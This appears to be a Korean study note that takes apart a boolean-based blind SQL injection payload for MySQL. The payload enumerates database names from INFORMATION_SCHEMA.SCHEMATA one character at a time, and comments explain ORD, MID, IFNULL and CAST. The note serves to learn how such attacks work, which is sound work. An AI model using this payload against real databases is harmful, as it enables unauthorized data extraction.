SELECT (
    CASE
        WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20))
                 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 4, 1),6,1))>1)
        THEN 0x6e616d65 -- name (When 조건 만족시)
        ELSE (SELECT 8188 UNION SELECT 1472) -- (when 조건 불만족시)
    END
    )
)


-- ORD : 아스키 코드 값을 반환하는 함수
-- MID : 문자에 지정한 시작 위치를 기준으로 일정 갯수를 가져오는 함수
-- MID("STR, 2, 2) -> TR

-- SELECT DISTINCT : 범주 확인, 컬럼 조회시 중복된 값을 제외하고 유일한 값을 가져옴
-- SELECT DISTINCT 컬럼 FROM 테이블;

-- IFNULL : 해당 필드의 값이 NULL을 반환할때 다른 값으로 출력할 수 있도록 한다.
-- SELECT IFNULL(필드명, "대체할 값") FROM 테이블 명;

-- CAST : 인수로 전달받은 값을 명시된 타입으로 변환하여 반환한다.
-- CAST(expr AS type) -> NCHAR

-- SELECT schema_name FROM information_schema.schemata
-- -> Mysql서버에 어떤 데이터베이스들이 있는지 확인
-- -> 해당 쿼리는 SHOW databases 와 동일한 효과를 냄


